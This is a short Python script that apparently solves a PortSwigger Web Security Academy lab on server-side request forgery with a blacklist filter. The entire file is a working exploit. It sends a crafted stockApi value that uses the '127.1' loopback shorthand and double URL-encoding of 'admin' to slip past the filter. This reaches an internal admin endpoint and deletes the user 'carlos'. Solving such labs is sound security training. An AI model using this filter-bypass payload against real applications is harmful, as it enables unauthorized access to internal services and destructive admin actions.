#https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-circumventing-defenses/ssrf/lab-ssrf-with-blacklist-filter#
URL = "https://0a7b002e0386a68b80a6d04500fb0039.web-security-academy.net"
import requests
client = requests.sessions.Session()
stock_url = URL + "/product/stock"
r = client.get(url=URL)
#print(r.text)
data ={
    'stockApi':'http://127.1/%61dmin/delete?username=carlos'
} #url encoded a to %61 then requests library will encode '%' to %25, making it %2561
r = client.post(url=stock_url, data=data, allow_redirects=False)
print(r.status_code)
#print(r.text)
